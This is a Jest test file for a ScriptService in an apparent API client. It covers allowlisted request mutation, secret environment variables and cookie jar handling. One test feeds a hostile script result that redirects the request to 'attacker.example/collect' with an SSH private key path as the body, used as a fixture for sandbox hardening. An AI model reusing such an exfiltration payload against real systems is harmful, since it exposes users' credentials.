import { ScriptService, SCRIPT_MUTABLE_REQUEST_FIELDS } from '../../src/modules/services/ScriptService.js';

describe('ScriptService._mergeModifiedRequest', () => {
    let service;

    beforeEach(() => {
        service = new ScriptService(null, null, null);
    });

    const baseConfig = () => ({
        url: 'https://api.example.com/users',
        method: 'GET',
        headers: { Accept: 'application/json' },
        body: null,
        queryParams: { page: '1' },
        pathParams: {},
        bodyType: 'json',
        verifySsl: true,
        auth: { type: 'bearer', token: 'secret' },
        clientCert: { certPath: '/tmp/client.pem' },
        timeout: 30000,
        followRedirects: true
    });

    it('applies allowlisted mutations from the script result', () => {
        const merged = service._mergeModifiedRequest(baseConfig(), {
            url: 'https://api.example.com/v2/users',
            method: 'POST',
            headers: { Accept: 'text/plain' },
            body: '{"a":1}',
            queryParams: { page: '2' },
            pathParams: { id: '42' }
        });

        expect(merged.url).toBe('https://api.example.com/v2/users');
        expect(merged.method).toBe('POST');
        expect(merged.headers).toEqual({ Accept: 'text/plain' });
        expect(merged.body).toBe('{"a":1}');
        expect(merged.queryParams).toEqual({ page: '2' });
        expect(merged.pathParams).toEqual({ id: '42' });
    });

    it('drops non-allowlisted fields a script injects into the request', () => {
        const merged = service._mergeModifiedRequest(baseConfig(), {
            url: 'https://attacker.example/collect',
            bodyType: 'binary',
            body: { filePath: '/home/user/.ssh/id_rsa' },
            verifySsl: false,
            clientCert: { certPath: '/tmp/evil.pem' },
            auth: { type: 'bearer', token: 'attacker' },
            timeout: 1,
            followRedirects: false
        });

        expect(merged.url).toBe('https://attacker.example/collect');
        expect(merged.body).toEqual({ filePath: '/home/user/.ssh/id_rsa' });
        expect(merged.bodyType).toBe('json');
        expect(merged.verifySsl).toBe(true);
        expect(merged.clientCert).toEqual({ certPath: '/tmp/client.pem' });
        expect(merged.auth).toEqual({ type: 'bearer', token: 'secret' });
        expect(merged.timeout).toBe(30000);
        expect(merged.followRedirects).toBe(true);
    });

    it('preserves config-only fields when the script mutates only allowlisted ones', () => {
        const merged = service._mergeModifiedRequest(baseConfig(), { method: 'DELETE' });

        expect(merged.method).toBe('DELETE');
        expect(merged.bodyType).toBe('json');
        expect(merged.verifySsl).toBe(true);
        expect(merged.auth).toEqual({ type: 'bearer', token: 'secret' });
    });

    it('leaves unmentioned allowlisted fields untouched', () => {
        const config = baseConfig();
        const merged = service._mergeModifiedRequest(config, { url: 'https://api.example.com/v2' });

        expect(merged.headers).toEqual(config.headers);
        expect(merged.queryParams).toEqual(config.queryParams);
    });

    it.each([undefined, null, 'string', 42, ['array'], true])(
        'returns the original config for non-object script result: %p',
        (badResult) => {
            const config = baseConfig();
            expect(service._mergeModifiedRequest(config, badResult)).toBe(config);
        }
    );

    it('does not mutate the original request config', () => {
        const config = baseConfig();
        service._mergeModifiedRequest(config, { url: 'https://changed.example', verifySsl: false });

        expect(config.url).toBe('https://api.example.com/users');
        expect(config.verifySsl).toBe(true);
    });

    it('ignores inherited (non-own) properties on the script result', () => {
        const proto = { verifySsl: false };
        const result = Object.create(proto);
        result.url = 'https://api.example.com/v2';

        const merged = service._mergeModifiedRequest(baseConfig(), result);

        expect(merged.url).toBe('https://api.example.com/v2');
        expect(merged.verifySsl).toBe(true);
    });
});

describe('SCRIPT_MUTABLE_REQUEST_FIELDS', () => {
    it('matches the fields seeded into the script request object', () => {
        expect([...SCRIPT_MUTABLE_REQUEST_FIELDS].sort()).toEqual(
            ['body', 'headers', 'method', 'pathParams', 'queryParams', 'url'].sort()
        );
    });

    it('is frozen', () => {
        expect(Object.isFrozen(SCRIPT_MUTABLE_REQUEST_FIELDS)).toBe(true);
    });
});

describe('ScriptService._applyEnvironmentChanges', () => {
    let service;
    let environmentService;

    beforeEach(() => {
        environmentService = {
            getActiveEnvironment: jest.fn().mockResolvedValue({
                id: 'env_1',
                variables: { token: '', host: 'example.com' },
                secretKeys: ['token']
            }),
            setVariable: jest.fn().mockResolvedValue(true),
            deleteVariable: jest.fn().mockResolvedValue(true)
        };
        service = new ScriptService(null, environmentService, null);
    });

    it('keeps a secret variable secret when a script updates it', async () => {
        await service._applyEnvironmentChanges({ token: 'fresh-jwt' });

        expect(environmentService.setVariable).toHaveBeenCalledWith('env_1', 'token', 'fresh-jwt', true);
    });

    it('stores non-secret variables as plaintext', async () => {
        await service._applyEnvironmentChanges({ host: 'staging.example.com' });

        expect(environmentService.setVariable).toHaveBeenCalledWith('env_1', 'host', 'staging.example.com', false);
    });

    it('deletes variables set to null', async () => {
        await service._applyEnvironmentChanges({ host: null });

        expect(environmentService.deleteVariable).toHaveBeenCalledWith('env_1', 'host');
        expect(environmentService.setVariable).not.toHaveBeenCalled();
    });

    it('treats missing secretKeys as no secrets', async () => {
        environmentService.getActiveEnvironment.mockResolvedValue({ id: 'env_2', variables: {} });

        await service._applyEnvironmentChanges({ token: 'value' });

        expect(environmentService.setVariable).toHaveBeenCalledWith('env_2', 'token', 'value', false);
    });

    it('does nothing without an active environment', async () => {
        environmentService.getActiveEnvironment.mockResolvedValue(null);

        await service._applyEnvironmentChanges({ token: 'value' });

        expect(environmentService.setVariable).not.toHaveBeenCalled();
        expect(environmentService.deleteVariable).not.toHaveBeenCalled();
    });
});

describe('ScriptService cookie jar bridge', () => {
    let service;
    let cookieController;

    beforeEach(async () => {
        service = new ScriptService(null, null, null);
        cookieController = {
            getCookiesForScripts: jest.fn().mockResolvedValue([
                { id: 'env|api.example.com|/|session', name: 'session', value: 'abc', domain: 'api.example.com' }
            ]),
            applyScriptCookieChanges: jest.fn().mockResolvedValue(undefined)
        };
        const { app } = await import('../../src/modules/appContext.js');
        app.cookieController = cookieController;
        app.getApiHandlerSettingsCache = () => ({ cookieJarEnabled: true });
    });

    afterEach(async () => {
        const { app } = await import('../../src/modules/appContext.js');
        delete app.cookieController;
        delete app.getApiHandlerSettingsCache;
    });

    it('seeds the sandbox with the active environment cookies', async () => {
        const cookies = await service._readCookieJar();

        expect(cookies).toHaveLength(1);
        expect(cookies[0].name).toBe('session');
    });

    it('reads an empty jar when cookies are disabled', async () => {
        const { app } = await import('../../src/modules/appContext.js');
        app.getApiHandlerSettingsCache = () => ({ cookieJarEnabled: false });

        expect(await service._readCookieJar()).toEqual([]);
    });

    it('reads an empty jar when the cookie feature is absent', async () => {
        const { app } = await import('../../src/modules/appContext.js');
        delete app.cookieController;

        expect(await service._readCookieJar()).toEqual([]);
    });

    it('forwards recorded cookie operations to the controller', async () => {
        const changes = [{ op: 'set', cookie: { name: 'a', value: '1', domain: 'api.example.com' } }];

        await service._applyCookieChanges(changes);

        expect(cookieController.applyScriptCookieChanges).toHaveBeenCalledWith(changes);
    });

    it('ignores an empty or missing change list', async () => {
        await service._applyCookieChanges(undefined);
        await service._applyCookieChanges([]);

        expect(cookieController.applyScriptCookieChanges).not.toHaveBeenCalled();
    });

    it('discards cookie writes when cookies are disabled', async () => {
        const { app } = await import('../../src/modules/appContext.js');
        app.getApiHandlerSettingsCache = () => ({ cookieJarEnabled: false });

        await service._applyCookieChanges([{ op: 'clear' }]);

        expect(cookieController.applyScriptCookieChanges).not.toHaveBeenCalled();
    });

    it('swallows controller failures so a script cannot break the request', async () => {
        cookieController.applyScriptCookieChanges.mockRejectedValue(new Error('store down'));

        await expect(service._applyCookieChanges([{ op: 'clear' }])).resolves.toBeUndefined();
    });
});
